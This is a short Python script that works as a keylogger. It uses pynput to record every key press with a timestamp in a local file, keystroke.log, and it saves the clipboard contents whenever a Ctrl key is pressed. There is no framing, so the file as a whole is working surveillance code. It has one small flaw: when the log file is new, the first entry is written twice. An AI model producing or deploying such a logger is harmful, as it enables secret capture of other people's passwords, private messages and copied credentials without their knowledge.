import pyperclip

from datetime import datetime
from pynput.keyboard import Listener

import os


def log_key_press(key):
    # Process the key press, get contents of the clipboard
    key = str(key).replace("'", "")
    line_to_write = None
    now = str(datetime.now())

    if key == 'Key.ctrl_l' or key == 'Key.ctrl_r':
        line_to_write = f"{now}: Clipboard - {pyperclip.paste()}"
    else:
        line_to_write = f"{now}: Key Press - {key}"

    # Write the output to the file
    if (not os.path.exists("keystroke.log")):
        with open("keystroke.log", 'a') as f:
            f.write(f"{line_to_write}\n")
    with open("keystroke.log", 'a') as f:
        f.write(f"{line_to_write}\n")

def start():
    # 1. Figure out how to track key presses
    with Listener(on_press=log_key_press) as l:
        l.join()

if __name__ == '__main__':
    start()
